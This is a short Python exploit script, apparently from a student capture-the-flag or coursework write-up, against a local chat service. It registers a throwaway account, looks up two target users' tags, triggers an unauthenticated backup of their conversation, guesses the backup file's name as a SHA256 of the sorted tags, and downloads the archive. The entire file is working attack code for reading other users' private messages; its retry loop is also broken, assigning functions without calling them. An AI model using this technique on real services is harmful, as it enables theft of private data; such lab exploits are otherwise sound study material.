import requests
import hashlib
import json
from checklib import *

URL = 'http://0.0.0.0:8080'

with open('/home/kali/Desktop/VSCode_files/STUDY/kursach/writeup/attack_data.json', 'r') as f:
    attack_data = json.load(f)

nick = rnd_username()
tag = rnd_string(10)
passw = rnd_password()

r = requests.post(f'{URL}/register', json={'nickname': nick, 'tag': tag, 'password': passw})
data = r.status_code

while data != 201:
    nick = rnd_username
    tag = rnd_string
    passw = rnd_password

    r = requests.post(f'{URL}/register', json={'nickname': nick, 'tag': tag, 'password': passw})
    data = r.status_code

session = requests.Session()

r = session.post(f'{URL}/login', json={'tag': tag, 'password': passw})

r = session.get(f'{URL}/users')

users = r.json()
tags = []

for user in users:
    if user['nickname'] == attack_data["nickname_1"] or user['nickname'] == attack_data["nickname_2"]:
        tags.append(user['tag'])

if len(tags) != 2:
    print('ПИЗДААААА')
    exit(1)

r = requests.post(f'{URL}/backup/{attack_data["convo_id"]}')
data = r.text

if data == 'Backup created':
    tags.sort()
    joined = "_".join(tags)
    # Создаем хэш SHA256
    hasher = hashlib.sha256()
    hasher.update(joined.encode('utf-8'))
    backup_name = hasher.hexdigest() + '.zip'

    # Скачиваем архив
    r = requests.get(f'{URL}/backup/{backup_name}', stream=True)  # Указываем stream=True для больших файлов
    if r.status_code == 200:
        with open(f'/home/kali/Desktop/VSCode_files/STUDY/kursach/writeup/{backup_name}', 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):  # Читаем и записываем файл порциями
                f.write(chunk)
        print(f"Backup {backup_name} downloaded successfully.")
    else:
        print(f"Failed to download backup: {r.status_code}, {r.text}")
